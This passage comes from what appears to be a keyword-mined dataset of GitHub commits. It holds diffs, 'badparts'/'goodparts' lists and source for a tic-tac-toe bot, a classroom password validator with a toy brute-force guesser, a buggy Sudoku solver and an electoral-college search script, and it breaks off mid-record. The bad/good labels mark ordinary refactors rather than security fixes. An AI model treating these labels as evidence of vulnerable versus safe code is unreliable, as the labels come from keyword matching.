int(num_players)\n\t\t\telif num_players == 'change icons':\n\t\t\t\tself.advancedGameSettings(num_players)\n\n\t\t# if user selected single player\n\t\tif num_players == 1:\n\t\t\t# choose the player icon\n\t\t\tplayer_choice = self.BLANK_POS\n\t\t\twhile player_choice != self.PLAYER_0_ICON and player_choice != self.PLAYER_1_ICON:\n\t\t\t\tplayer_choice = input(\n\t\t\t\t\tf\"{self.PLAYER_0_ICON}s plays first, do you want to be {self.PLAYER_0_ICON} or {self.PLAYER_1_ICON}? \"\n\t\t\t\t)\n\t\t\t\tif player_choice != self.PLAYER_0_ICON and player_choice != self.PLAYER_1_ICON:\n\t\t\t\t\tprint(\"That is not a valid option, make sure to match the letter's upper\/lower case.\")\n\n\t\t\t# set the players based off the user's choice\n\t\t\tif player_choice == self.PLAYER_0_ICON:\n\t\t\t\tself.player_0_move = self.userMove\n\t\t\t\tself.player_1_move = self.botMove\n\t\t\telse:\n\t\t\t\tself.player_0_move = self.botMove\n\t\t\t\tself.player_1_move = self.userMove\n\t\t# multiplayer\n\t\telse:\n\t\t\tprint(f\"{self.PLAYER_0_ICON}s plays first, decide who will be the first player.\")\n\t\t\tself.player_0_move = self.userMove\n\t\t\tself.player_1_move = self.userMove\n\n\tdef terminalGame(self):\n\t\t\"\"\"Starts a TicTacToe game in the terminal and calls supporting functions.\n\t\tTakes no inputs and makes no return.\n\t\t\"\"\"\n\n\t\tif os.name == \"nt\":\n\t\t\tos.system(\"color\")\n\n\t\tself.gameSettingsPrompt()\n\n\t\tprint(\"If you wish to stop playing the game enter 'exit'.\")\n\t\t# Start of game\n\t\tself.displayBoard()\n\t\twhile True:\n\t\t\tprint(\"First player's turn.\")\n\t\t\trow, col = self.player_0_move(self.PLAYER_0)\n\t\t\tif row == -1 and col == -1: break  # noqa: E701\n\t\t\tself.updateBoard(row, col, self.PLAYER_0)\n\t\t\tself.displayBoard()\n\t\t\tif self.game_state != self.GAME_IN_PROGRESS: break  # noqa: E701\n\n\t\t\tprint(\"Second player's turn.\")\n\t\t\trow, col = self.player_1_move(self.PLAYER_1)\n\t\t\tif row == -1 and col == -1: break  # noqa: E701\n\t\t\tself.updateBoard(row, col, self.PLAYER_1)\n\t\t\tself.displayBoard()\n\t\t\tif self.game_state != self.GAME_IN_PROGRESS: break  # noqa: E701\n\n\t\tself.displayResult()\n\t\tself.resetGame()\n\n\tdef displayBoard(self):\n\t\t\"\"\"Prints the board for the user to see.\n\n\t\tTakes no arguments and gives no return;\n\t\trather, calls the self.board object directly and prints directly to console.\n\t\t\"\"\"\n\n\t\tresult = \"\\n\"\n\t\tfor i in range(0, 9):\n\t\t\trow = floor(i \/ 3)\n\t\t\tcol = i % 3\n\t\t\tif i in (0, 3, 6):\n\t\t\t\tif self.board[row][col] != self.BLANK_POS:\n\t\t\t\t\tresult += f\"\\t {self.PLAYER_0_ICON if self.board[row][col] == self.PLAYER_0 else self.PLAYER_1_ICON} \u2551\"\n\t\t\t\telse:\n\t\t\t\t\tresult += f\"\\t{self.blank_pos_color} {i + 1} {self.exit_color_code}\u2551\"\n\t\t\telif i in (1, 4, 7):\n\t\t\t\tif self.board[row][col] != self.BLANK_POS:\n\t\t\t\t\tresult += f\" {self.PLAYER_0_ICON if self.board[row][col] == self.PLAYER_0 else self.PLAYER_1_ICON} \u2551\"\n\t\t\t\telse:\n\t\t\t\t\tresult += f\"{self.blank_pos_color} {i + 1} {self.exit_color_code}\u2551\"\n\n\t\t\telif i in (2, 5, 8):\n\t\t\t\tif self.board[row][col] != self.BLANK_POS:\n\t\t\t\t\tresult += f\" {self.PLAYER_0_ICON if self.board[row][col] == self.PLAYER_0 else self.PLAYER_1_ICON}\\n\"\n\t\t\t\telse:\n\t\t\t\t\tresult += f\"{self.blank_pos_color} {i + 1} {self.exit_color_code}\\n\"\n\t\t\t\tif i in (2, 5):\n\t\t\t\t\tresult += \"\\t\u2550\u2550\u2550\u256c\u2550\u2550\u2550\u256c\u2550\u2550\u2550\\n\"\n\n\t\tprint(result)\n\n\tdef displayResult(self):\n\t\t\"\"\"Checks the game_state and displays how the game ended.\n\t\tIt takes in nothing and returns nothing\n\t\t\"\"\"\n\n\t\tif self.game_state == self.PLAYER_0_WINNER:\n\t\t\tprint(f\"{self.PLAYER_0_ICON} won the game!\")\n\t\telif self.game_state == self.PLAYER_1_WINNER:\n\t\t\tprint(f\"{self.PLAYER_1_ICON} won the game!\")\n\t\telif self.game_state == self.DRAW_GAME:\n\t\t\tprint(\"The game ended in a draw\")\n\t\telse:\n\t\t\t# for no winner\n\t\t\tpass\n\n\tdef userMove(self, player_icon):\n\t\t\"\"\"Processes everything that is needed for a user to make a move,\n\t\tincluding checking if input was valid (through promptUser(), spot is free to move in, etc.)\n\n\t\t:param player_icon: The player_icon is not used in userMove but is necessary to avoid bugs with botMove.\n\t\t\t\t\tSee how player_icon argument is used in botMove(self, player_icon),\n\t\t\t\t\tand how both of these functions are used in startTerminalGame(self) for details.\n\t\t\"\"\"\n\n\t\tvalid_move = False\n\t\trow, col = 0, 0\n\n\t\twhile not valid_move:\n\t\t\trow, col = self.promptUser()\n\t\t\tif row != -1 and col != -1:\n\t\t\t\tvalid_move = self.checkValidMove(row, col)\n\t\t\t\tif not valid_move:\n\t\t\t\t\tprint(\"That space is already taken\")\n\t\t\telse:\n\t\t\t\treturn row, col\n\n\t\treturn row, col\n\n\t@staticmethod\n\tdef promptUser():\n\t\t\"\"\"Requests user input for desired move on user's turn, validates, and then returns selected space.\n\n\t\t:return: (row, col) as the row and column of the space selected by the user for their move.\n\t\t\"\"\"\n\n\t\twhile True:\n\t\t\tchoice = input(\"Where do you want to play? \")\n\t\t\tif len(choice) == 1 and choice.isnumeric():\n\t\t\t\tchoice = int(choice) - 1\n\t\t\t\trow = floor(choice \/ 3)\n\t\t\t\tcol = choice % 3\n\n\t\t\t\treturn row, col\n\t\t\telif choice == 'exit':\n\t\t\t\treturn -1, -1\n\n\nif __name__ == \"__main__\":\n\tTicTacTerminal().terminalGame()\n"}},"msg":"New and improved bot!\n\nThe previous approach was WAAAAY too brute force. Updated bot to use a new base strategy and some smart checking to reduce edge-cases down to three unique scenarios (as well as factoring in rotations\/reflections of those scenarios).  I have not been this confident since the last time I asked @MicahWW to check the bot, and that request is going out again now!"}},"https:\/\/github.com\/RohanMalikRCDS\/DataStructuresAlgorithms":{"769e8757c80ebfe3c6c34fce171a7f56a9055398":{"url":"https:\/\/api.github.com\/repos\/RohanMalikRCDS\/DataStructuresAlgorithms\/commits\/769e8757c80ebfe3c6c34fce171a7f56a9055398","html_url":"https:\/\/github.com\/RohanMalikRCDS\/DataStructuresAlgorithms\/commit\/769e8757c80ebfe3c6c34fce171a7f56a9055398","message":"Improve and add optimizations to brute forcing algorithm","sha":"769e8757c80ebfe3c6c34fce171a7f56a9055398","keyword":"brute force improve","diff":"diff --git a\/Unit4_Recursion\/_safeCrack.py b\/Unit4_Recursion\/_safeCrack.py\nindex adadc06..8a5d05e 100644\n--- a\/Unit4_Recursion\/_safeCrack.py\n+++ b\/Unit4_Recursion\/_safeCrack.py\n@@ -39,39 +39,37 @@ def validateHelper(password, stage):\n \n # string that stores every single entry\n chars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890`~!@#$%^&*()-_=+[{]}\\\\|;:'\\\",<.>\/?\"\n+tries = 0\n \n \n # indices -> uppercase: 0-25; lowercase: 26-51; numbers: 52-61; special chars: 62-93\n # uses brute force to attempt to guess the user's password\n def bruteForce(password):\n     for i in range(2, 7):\n-        result = bruteForceHelper(list(password), [\"a\"] * i, 0)\n+        result = bruteForceHelper(list(password), i, [\"a\"] * i, 0, [0])\n         if result is not None:\n-            return \"\".join(result)\n+            return result[0]\n         print(\"finished\", i, \"letters\")\n \n \n-def bruteForceHelper(password, guess, i):\n-    if i == len(guess):\n-        return password if guess == password else None\n+def bruteForceHelper(password, length, guess, i, num):\n+    if i == length:\n+        num[0] += 1\n+        return num if guess == password else None\n     for char in chars:\n         new = guess\n         new[i] = char\n-        result = bruteForceHelper(password, new, i + 1)\n+        result = bruteForceHelper(password, length, new, i + 1, num)\n         if result is not None:\n             return result\n     return None\n \n \n-def replaceCharAt(string, char, index):\n-    return string[:-1] + char if index == len(string) - 1 else string[:index] + char + string[index + 1:]\n-\n-\n # --- testing ---\n # print(validate(\"ABc12!\"))\n # print(validate(\"sbfhabSJ1342@#$\")\n now = time.time()\n-print(bruteForce(\"3p!cER\"))\n+print(bruteForce(\"3p!c\"))\n done = time.time()\n-print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now)%60, \"sec\")\n+print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now) % 60, \"sec\")\n \n","files":{"\/Unit4_Recursion\/_safeCrack.py":{"changes":[{"diff":"\n \n # string that stores every single entry\n chars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890`~!@#$%^&*()-_=+[{]}\\\\|;:'\\\",<.>\/?\"\n+tries = 0\n \n \n # indices -> uppercase: 0-25; lowercase: 26-51; numbers: 52-61; special chars: 62-93\n # uses brute force to attempt to guess the user's password\n def bruteForce(password):\n     for i in range(2, 7):\n-        result = bruteForceHelper(list(password), [\"a\"] * i, 0)\n+        result = bruteForceHelper(list(password), i, [\"a\"] * i, 0, [0])\n         if result is not None:\n-            return \"\".join(result)\n+            return result[0]\n         print(\"finished\", i, \"letters\")\n \n \n-def bruteForceHelper(password, guess, i):\n-    if i == len(guess):\n-        return password if guess == password else None\n+def bruteForceHelper(password, length, guess, i, num):\n+    if i == length:\n+        num[0] += 1\n+        return num if guess == password else None\n     for char in chars:\n         new = guess\n         new[i] = char\n-        result = bruteForceHelper(password, new, i + 1)\n+        result = bruteForceHelper(password, length, new, i + 1, num)\n         if result is not None:\n             return result\n     return None\n \n \n-def replaceCharAt(string, char, index):\n-    return string[:-1] + char if index == len(string) - 1 else string[:index] + char + string[index + 1:]\n-\n-\n # --- testing ---\n # print(validate(\"ABc12!\"))\n # print(validate(\"sbfhabSJ1342@#$\")\n now = time.time()\n-print(bruteForce(\"3p!cER\"))\n+print(bruteForce(\"3p!c\"))\n done = time.time()\n-print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now)%60, \"sec\")\n+print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now) % 60, \"sec\")\n \n","add":10,"remove":12,"filename":"\/Unit4_Recursion\/_safeCrack.py","badparts":["        result = bruteForceHelper(list(password), [\"a\"] * i, 0)","            return \"\".join(result)","def bruteForceHelper(password, guess, i):","    if i == len(guess):","        return password if guess == password else None","        result = bruteForceHelper(password, new, i + 1)","def replaceCharAt(string, char, index):","    return string[:-1] + char if index == len(string) - 1 else string[:index] + char + string[index + 1:]","print(bruteForce(\"3p!cER\"))","print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now)%60, \"sec\")"],"goodparts":["tries = 0","        result = bruteForceHelper(list(password), i, [\"a\"] * i, 0, [0])","            return result[0]","def bruteForceHelper(password, length, guess, i, num):","    if i == length:","        num[0] += 1","        return num if guess == password else None","        result = bruteForceHelper(password, length, new, i + 1, num)","print(bruteForce(\"3p!c\"))","print(\"guessed in\", (done-now)\/\/60, \"min\", (done-now) % 60, \"sec\")"]}],"source":"\n\"\"\" ---SafeCrack --- Password validator and brute-force cracker. Has two main functionalities: a function that checks whether a given password is valid according to a set of specifications, and a function that uses brute force to guess a user's password by trying combinations until it finds a password that exactly matches. \"\"\" import time def validate(password): return validateHelper(password, \"length\") def validateHelper(password, stage): if stage==\"length\": return validateHelper(password, \"upper\") if 6 <=len(password) <=18 else False elif stage==\"upper\": return validateHelper(password, \"lower\") if len( [c for c in password if c.isalpha() and c==c.upper()]) >=2 else False elif stage==\"lower\": return validateHelper(password, \"num\") if len( [c for c in password if c.isalpha() and c==c.lower()]) >=1 else False elif stage==\"num\": return validateHelper(password, \"spec\") if len([c for c in password if c.isdigit()]) >=2 else False else: return len([c for c in password if not(c.isalpha() or c.isdigit())]) >=1 chars=\"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890`~!@ def bruteForce(password): for i in range(2, 7): result=bruteForceHelper(list(password),[\"a\"] * i, 0) if result is not None: return \"\".join(result) print(\"finished\", i, \"letters\") def bruteForceHelper(password, guess, i): if i==len(guess): return password if guess==password else None for char in chars: new=guess new[i]=char result=bruteForceHelper(password, new, i +1) if result is not None: return result return None def replaceCharAt(string, char, index): return string[:-1] +char if index==len(string) -1 else string[:index] +char +string[index +1:] now=time.time() print(bruteForce(\"3p!cER\")) done=time.time() print(\"guessed in\",(done-now)\/\/60, \"min\",(done-now)%60, \"sec\") ","sourceWithComments":"\"\"\"\n--- SafeCrack ---\nPassword validator and brute-force cracker. Has two main functionalities: a function that checks whether a given password\nis valid according to a set of specifications, and a function that uses brute force to guess a user's password by trying\ncombinations until it finds a password that exactly matches.\n\"\"\"\n\n# checks a user's password for validity based on the following conditions:\n# -> between 6 to 18 characters in length\n# -> contains at least 2 uppercase letters\n# -> contains at least 1 lowercase letter\n# -> contains at least 2 numbers\n# -> contains at least 1 special characters\n# @param password: the password string to validate\nimport time\n\n\ndef validate(password):\n    return validateHelper(password, \"length\")\n\n\n# helper function that recursively runs validation stage by stage (for each of the stipulations laid out above).\n# @param password: passed straight through from the main function\n# @param stage: what stage of validation the function is on (possible values: \"len\", \"upper\", \"lower\", \"num\", \"spec\")\ndef validateHelper(password, stage):\n    if stage == \"length\":\n        return validateHelper(password, \"upper\") if 6 <= len(password) <= 18 else False\n    elif stage == \"upper\":\n        return validateHelper(password, \"lower\") if len(\n            [c for c in password if c.isalpha() and c == c.upper()]) >= 2 else False\n    elif stage == \"lower\":\n        return validateHelper(password, \"num\") if len(\n            [c for c in password if c.isalpha() and c == c.lower()]) >= 1 else False\n    elif stage == \"num\":\n        return validateHelper(password, \"spec\") if len([c for c in password if c.isdigit()]) >= 2 else False\n    else:  # stage == \"spec\"\n        return len([c for c in password if not (c.isalpha() or c.isdigit())]) >= 1\n\n\n# string that stores every single entry\nchars = \"QWERTYUIOPASDFGHJKLZXCVBNMqwertyuiopasdfghjklzxcvbnm1234567890`~!@#$%^&*()-_=+[{]}\\\\|;:'\\\",<.>\/?\"\n\n\n# indices -> uppercase: 0-25; lowercase: 26-51; numbers: 52-61; special chars: 62-93\n# uses brute force to attempt to guess the user's password\ndef bruteForce(password):\n    for i in range(2, 7):\n        result = bruteForceHelper(list(password), [\"a\"] * i, 0)\n        if result is not None:\n            return \"\".join(result)\n        print(\"finished\", i, \"letters\")\n\n\ndef bruteForceHelper(password, guess, i):\n    if i == len(guess):\n        return password if guess == password else None\n    for char in chars:\n        new = guess\n        new[i] = char\n        result = bruteForceHelper(password, new, i + 1)\n        if result is not None:\n            return result\n    return None\n\n\ndef replaceCharAt(string, char, index):\n    return string[:-1] + char if index == len(string) - 1 else string[:index] + char + string[index + 1:]\n\n\n# --- testing ---\n# print(validate(\"ABc12!\"))\n# print(validate(\"sbfhabSJ1342@#$\")\nnow = time.time()\nprint(bruteForce(\"3p!cER\"))\ndone = time.time()\nprint(\"guessed in\", (done-now)\/\/60, \"min\", (done-now)%60, \"sec\")\n\n"}},"msg":"Improve and add optimizations to brute forcing algorithm"}},"https:\/\/github.com\/wSemis\/Sudoku-solver-for-fun":{"6721438a73aa6964e395f42e6ecd26ee4eaa4dc3":{"url":"https:\/\/api.github.com\/repos\/wSemis\/Sudoku-solver-for-fun\/commits\/6721438a73aa6964e395f42e6ecd26ee4eaa4dc3","html_url":"https:\/\/github.com\/wSemis\/Sudoku-solver-for-fun\/commit\/6721438a73aa6964e395f42e6ecd26ee4eaa4dc3","message":"Add brute force module and improve code","sha":"6721438a73aa6964e395f42e6ecd26ee4eaa4dc3","keyword":"brute force improve","diff":"diff --git a\/Sudoku.py b\/Sudoku.py\nnew file mode 100644\nindex 0000000..da8a59f\n--- \/dev\/null\n+++ b\/Sudoku.py\n@@ -0,0 +1,149 @@\n+from copy import copy, deepcopy\n+from collections import Counter\n+\n+class Sudoku:\n+    def __init__(self, sudokuList, advancedInit=True):\n+        self.sudokuList = sudokuList\n+        self.canFill = [[False] * 9 for _ in range(9)]\n+        self.toFillCount = 0\n+        self.candidates = [[[list(range(1,10))] for i in range(9)] for i in range(9)]\n+        self.candidatesSupport = [[[7] * 9 for i in range(9)] for j in range(9)]\n+        \n+        if advancedInit:\n+            if not self.isLegalGame():\n+                raise Exception('Invalid input grid')\n+            for i, r in enumerate(sudokuList):\n+                for j, c in enumerate(r):\n+                    if c == 0:\n+                        self.canFill[i][j] = True\n+                        self.toFill += 1\n+                    if c < 0 or c > 9:\n+                        raise Exception(f'Wrong Format, got {c}')\n+    \n+            for i, r in enumerate(sudokuList):\n+                for j, c in enumerate(r):\n+                    self.siege(i, j, c)\n+                \n+    def siege(self, r, c, val):\n+        if val == 0: return\n+        # line\n+        for i in range(9):\n+            if i == r: continue\n+            if val in self.candidates[i][c]:\n+                self.candidates[i][c].remove(val)\n+            self.candidatesSupport[i][c] &= 0 + 2 + 4\n+        for j in range(9):\n+            if j == c: continue\n+            if val in self.candidates[r][j]:\n+                self.candidates[r][j].remove(val)\n+            self.candidatesSupport[r][j] &= 1 + 0 + 4\n+\n+        #Square\n+        a, b = (r\/\/3) * 3, (c\/\/3) * 3\n+        for i in range(3):\n+            for j in range(3):\n+                if a+i==r and b+j==c: continue\n+                if val in self.candidates[a + i][b + j]:\n+                    self.candidates[a + i][b + j].remove(val) \n+                self.candidatesSupport[a + i][b + j] &= 1 + 2 + 0\n+    \n+    def unsiege(self, r, c, val):\n+        if val == 0: return\n+        # line\n+        for i in range(9):\n+            if i == r: continue\n+            self.candidatesSupport[i][c] |= 1\n+            if self.candidatesSupport[i][c] == 7:\n+                self.candidates[i][c].append(val)\n+        for j in range(9):\n+            if j == c: continue\n+            self.candidatesSupport[r][j] |= 2\n+            if self.candidatesSupport[r][j] == 7:\n+                self.candidates[r][j].append(val)\n+\n+        #Square\n+        a, b = (r\/\/3) * 3, (c\/\/3) * 3\n+        for i in range(3):\n+            for j in range(3):\n+                if a+i==r and b+j==c: continue\n+                self.candidatesSupport[a + i][b + j] |= 4\n+                if self.candidatesSupport[a + i][b + j] == 7:\n+                    self.candidates[a + i][b + j].append(val) \n+    \n+    def __repr__(self):\n+        return '\\n'.join([' '.join(line) for line in self.sudokuList])\n+    \n+    def __copy__(self):\n+        new = Sudoku(deepcopy(self.sudokuList))\n+        return new\n+            \n+    def __deepcopy__(self):\n+        new = Sudoku(deepcopy(self.sudokuList), advancedInit=False)\n+        new.canFill = deepcopy(self.canFill)\n+        new.candidates = deepcopy(self.candidates)\n+        new.candidatesSupport = deepcopy(self.candidatesSupport)\n+        new.toFillCount = self.toFillCount\n+        return new\n+    \n+    def getRow(self, r): return self.sudokuList[r]\n+    \n+    def getColumn(self, c): return [line[c] for line in self.sudokuList]\n+    \n+    def getSquare(self, r, c):\n+        a, b = 3 * r, 3 * c    \n+        square = []\n+        for i in range(3):\n+                for j in range(3):\n+                    square.append(self.sudokuList[a+i][b+j])\n+        return square    \n+                \n+    def isComplete(self):\n+        return self.toFillCount == 0\n+    \n+    def isLegalChange(self, r, c):\n+        row = self.getRow(r)\n+        column = self.getColumn(c)\n+        square = self.getSquare(r\/\/3, c\/\/3)\n+        return self.noDuplicate(row) and self.noDuplicate(column) and self.noDuplicate(square)\n+    \n+    def isLegalGame(self):\n+        # lines\n+        for i in range(9):\n+            row = self.getRow(i)\n+            column = self.getColumn(i)\n+            square = self.getSquare(i\/\/3, i%3)\n+            if not self.noDuplicate(row) or not self.noDuplicate(column) or not self.noDuplicate(sqaure):\n+                return False\n+        return True\n+        \n+    def noDuplicate(self,li):\n+        c = Counter(li)\n+        c.pop(0, None)\n+        return max(c.values()) < 2\n+    \n+    def changeNumber(self, row, column, number):\n+        \"\"\"Fill in number at given position. No changes made for unsuccessful fillin.\n+\n+        Args:\n+            row (int): Value of [0, 8]\n+            column (int): Value of [0, 8]\n+            number (int): Value of [1, 9]\n+\n+        Returns:\n+            int: 0 for successfullin; -1 for wrong position; 1 for illegal game\n+        \"\"\"        \n+\n+        if not self.canFill[row][column]:\n+            return -1\n+        \n+        prev = self.sudokuList[row][column]\n+        self.sudokuList[row][column] = number\n+        if self.isLegalChange(row, column):\n+            self.unsiege(prev)\n+            self.siege(val)\n+            if prev == 0:\n+                self.toFillCount -= 1\n+            return 0\n+        else:\n+            self.sudokuList[row][column] = prev\n+            return 1\n\\ No newline at end of file\ndiff --git a\/__init__.py b\/__init__.py\nnew file mode 100644\nindex 0000000..e69de29\ndiff --git a\/readInput.py b\/readInput.py\nindex f591346..0338bd3 100644\n--- a\/readInput.py\n+++ b\/readInput.py\n@@ -1,8 +1,8 @@\n '''\n Regulates passing format for this sudoku solver\n \n-Use nested lists as input\n-__sudokuList[row][col]__\n+Pass in: 9 lines of cell numbers without space; empty cells filled with 0s\n+return __sudokuList[row][col]__ = integer\n '''\n \n import sys\ndiff --git a\/solver.py b\/solver.py\nnew file mode 100644\nindex 0000000..76a1e03\n--- \/dev\/null\n+++ b\/solver.py\n@@ -0,0 +1,29 @@\n+from Sudoku import Sudoku\n+\n+class Solver:\n+    def __init__(self, sudokuList):\n+        self.puzzle = Sudoku(sudokuList)\n+        \n+    def solve(self, params):\n+        if params['method'] == 'bruteForce':\n+            print('Success:',self.bruteForce(0))\n+            \n+        if 'print' not in params or params['print']:\n+            print(self.puzzle)\n+            \n+    def bruteForce(self, num):\n+        if num >= 81 or self.puzzle.isComplete():\n+            return True\n+        i, j = num \/\/9, num % 9\n+        \n+        if self.puzzle.canFill[i][j]:\n+            vals = self.puzzle.candidates\n+            for val in vals:\n+                result = self.puzzle.changeNumber(i, j, val)\n+                if result == 0:\n+                    if self.bruteForce(num + 1):\n+                        return True\n+            \n+            return False\n+        else:\n+            return self.bruteForce(num + 1)\n\\ No newline at end of file\n","files":{"\/readInput.py":{"changes":[{"diff":"\n '''\n Regulates passing format for this sudoku solver\n \n-Use nested lists as input\n-__sudokuList[row][col]__\n+Pass in: 9 lines of cell numbers without space; empty cells filled with 0s\n+return __sudokuList[row][col]__ = integer\n '''\n \n import s","add":2,"remove":2,"filename":"\/readInput.py","badparts":["Use nested lists as input","__sudokuList[row][col]__"],"goodparts":["Pass in: 9 lines of cell numbers without space; empty cells filled with 0s","return __sudokuList[row][col]__ = integer"]}],"source":"\n''' Regulates passing format for this sudoku solver Use nested lists as input __sudokuList[row][col]__ ''' import sys def readFromTxt(fn): with open(fn, 'r') as f: lines=f.readlines() sudokuList=[] for line in lines: if line.strip()=='': pass else: l=list(map(int, list(line.strip()))) sudokuList.append(l) assert len(sudokuList)==9, f'Corrupted file with line number of{len(sudokuList)}' return sudokuList def readFromConsole(): sudokuList=[] complete_inout=sys.stdin.read() for line in complete_inout: if line.strip()=='': pass elif line.strip()=='del': sudokuList.pop(-1) elif line.strip()=='clear': sudokuList=[] else: l=list(map(int, list(line.strip()))) sudokuList.append(l) assert len(sudokuList)==9, f'Corrupted file with line number of{len(sudokuList)}' return sudokuList ","sourceWithComments":"'''\nRegulates passing format for this sudoku solver\n\nUse nested lists as input\n__sudokuList[row][col]__\n'''\n\nimport sys\n\ndef readFromTxt(fn):\n    with open(fn, 'r') as f:\n        lines = f.readlines()\n    \n    sudokuList = []\n    for line in lines:\n        if line.strip() == '':\n            pass\n        else:\n            l = list(map(int, list(line.strip())))\n            sudokuList.append(l)\n            \n    assert len(sudokuList) == 9, f'Corrupted file with line number of {len(sudokuList)}'\n    return sudokuList\n\ndef readFromConsole():\n    sudokuList = []\n    \n    complete_inout = sys.stdin.read()\n    \n    for line in complete_inout:\n        if line.strip() == '':\n            pass\n        elif line.strip() == 'del':\n            sudokuList.pop(-1)\n        elif line.strip() == 'clear':\n            sudokuList = []\n        \n        else:\n            l = list(map(int, list(line.strip())))\n            sudokuList.append(l)\n\n    assert len(sudokuList) == 9, f'Corrupted file with line number of {len(sudokuList)}'\n    return sudokuList"}},"msg":"Add brute force module and improve code"}},"https:\/\/github.com\/dovhochsztein\/electoral_college":{"78d7fe3bf0cb75d34f73e6bfad8d66a81ecb0ab7":{"url":"https:\/\/api.github.com\/repos\/dovhochsztein\/electoral_college\/commits\/78d7fe3bf0cb75d34f73e6bfad8d66a81ecb0ab7","html_url":"https:\/\/github.com\/dovhochsztein\/electoral_college\/commit\/78d7fe3bf0cb75d34f73e6bfad8d66a81ecb0ab7","message":"brute force and first algo written, profiled, improved","sha":"78d7fe3bf0cb75d34f73e6bfad8d66a81ecb0ab7","keyword":"brute force improve","diff":"diff --git a\/main.py b\/main.py\nindex f59bab9..dc6cbf8 100644\n--- a\/main.py\n+++ b\/main.py\n@@ -4,9 +4,6 @@\n import numpy as np\n import time\n import pandas as pd\n-from collections import Counter\n-\n-\n \n \n def brute_force(states, population, electoral_votes):\n@@ -28,6 +25,7 @@ def brute_force(states, population, electoral_votes):\n     best_combination.sort()\n     return min_voters_won\/total_voters, number_checked, best_combination\n \n+\n def generate_order(states, population, electoral_votes):\n     state_dict = dict()\n     for state in states:\n@@ -41,6 +39,7 @@ def generate_order(states, population, electoral_votes):\n         state_dict[electoral_votes_amount] = list(np.array(states_at_that_amount)[order])\n     return state_dict\n \n+\n def algorithm_1(states, population, electoral_votes):\n     \"\"\"\n     group states by number of ec votes\n@@ -49,6 +48,7 @@ def algorithm_1(states, population, electoral_votes):\n     state_dict = generate_order(states, population, electoral_votes)\n     electoral_votes_amounts = list(state_dict.keys())\n     electoral_votes_amounts.sort()\n+    highest_vote_amount = max(electoral_votes_amounts)\n     multiplicities = [len(state_dict[electoral_votes_amount]) for electoral_votes_amount in electoral_votes_amounts]\n \n     total_electoral_votes = sum([electoral_votes[state] for state in states])\n@@ -57,13 +57,21 @@ def algorithm_1(states, population, electoral_votes):\n     best_combination = None\n \n     number_checked = 0\n+    # skipped_1 = 0\n+    # skipped_2 = 0\n     for outcome in itertools.product(*[range(multiplicity + 1) for multiplicity in multiplicities]):\n         number_checked += 1\n         electoral_votes_won = np.dot(outcome, electoral_votes_amounts)\n         if electoral_votes_won > total_electoral_votes \/ 2:\n-            # states_won = [state_dict[electoral_votes_amount][0:multiplicity] for electoral_votes_amount, multiplicity in\n-            #               zip(electoral_votes_amounts, outcome)]\n-            # states_won = [item for sublist in states_won for item in sublist]\n+            lowest_vote_total_index = next((i for i, x in enumerate(outcome) if x > 0), None)\n+            if electoral_votes_won > total_electoral_votes \/ 2 + highest_vote_amount:\n+                # skipped_1 += 1\n+                continue\n+            if lowest_vote_total_index is not None:\n+                lowest_vote_total = electoral_votes_amounts[lowest_vote_total_index]\n+                if electoral_votes_won > total_electoral_votes \/ 2 + lowest_vote_total:\n+                    # skipped_2 += 1\n+                    continue\n             states_won = [item for electoral_votes_amount, multiplicity in zip(electoral_votes_amounts, outcome)\n                           for item in state_dict[electoral_votes_amount][0:multiplicity]]\n \n@@ -72,6 +80,8 @@ def algorithm_1(states, population, electoral_votes):\n                 min_voters_won = voters_won\n                 best_combination = states_won\n     best_combination.sort()\n+    # print(skipped_1)\n+    # print(skipped_2)\n     return min_voters_won \/ total_voters, number_checked, best_combination\n \n \n@@ -83,6 +93,7 @@ def algorithm_1(states, population, electoral_votes):\n number_checked_algorithm_1 = list()\n \n numbers_to_consider = [5, 10, 15, 20, 25, 30, 50]\n+# numbers_to_consider = [5, 10, 15, 20, 25, 30]\n for number_to_consider in numbers_to_consider:\n \n     states = random.sample(state_list, number_to_consider)\n@@ -91,7 +102,7 @@ def algorithm_1(states, population, electoral_votes):\n         fraction, number_checked, best_combination = brute_force(states, population, electoral_votes)\n         print(fraction, number_checked, best_combination)\n         time_taken = time.time() - now\n-        print(f'time for {number_to_consider} states by brute force {time_taken}\\n')\n+        print(f'time for {number_to_consider} states by brute force: {time_taken}\\n')\n \n         time_brute.append(time_taken)\n         number_checked_brute.append(number_checked)\n@@ -100,11 +111,12 @@ def algorithm_1(states, population, electoral_votes):\n     fraction, number_checked, best_combination = algorithm_1(states, population, electoral_votes)\n     print(fraction, number_checked, best_combination)\n     time_taken = time.time() - now\n-    print(f'time for {number_to_consider} states by algorithm 1 {time_taken}\\n')\n+    print(f'time for {number_to_consider} states by algorithm 1: {time_taken}\\n')\n     time_algorithm_1.append(time_taken)\n     number_checked_algorithm_1.append(number_checked)\n \n-df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force', 'number_checked_algorithm_1', 'time_algorithm_1'])\n+df = pd.DataFrame(columns=['number of states', 'number_checked_brute_force', 'time_brute_force',\n+                           'number_checked_algorithm_1', 'time_algorithm_1'])\n df['number of states'] = numbers_to_consider\n df['number_checked_brute_force'].iloc[0:len(number_checked_brute)] = number_checked_brute\n df['time_brute_force'].iloc[0:len(time_brute)] = time_brute\n","files":{"\/main.py":{"changes":[{"diff":"\n import numpy as np\n import time\n import pandas as pd\n-from collections import Counter\n-\n-\n \n \n def brute_force(states, population, electoral_votes):\n","add":0,"remove":3,"filename":"\/main.py","badparts":["from collections import Counter"],"goodparts":[]},{"diff":"\n         fraction, number_checked, best_combination = brute_force(states, population, electoral_votes)\n         print(fraction, number_checked, best_combination)\n         time_taken = time.time() - now\n-        print(f'time for {number_to_consider} states by brute force {time_taken}\\n')\n+        print(f'time for {number_to_consider} states by brute force: {time_taken}\\n')\n \n         time_brute.append(time_taken)\n         number_checked_brute.append(number_checked)\n","add":1,"remove":1,"filename":"\/main.py","badparts":["        print(f'time for {number_to_consider} states by brute force {time_taken}\\n')"],"goodparts":["        print(f'time for {number_to_consider} states by brute force: {time_taken}\\n')"]},{"diff":"\n     fraction, number_checked, best_combination = 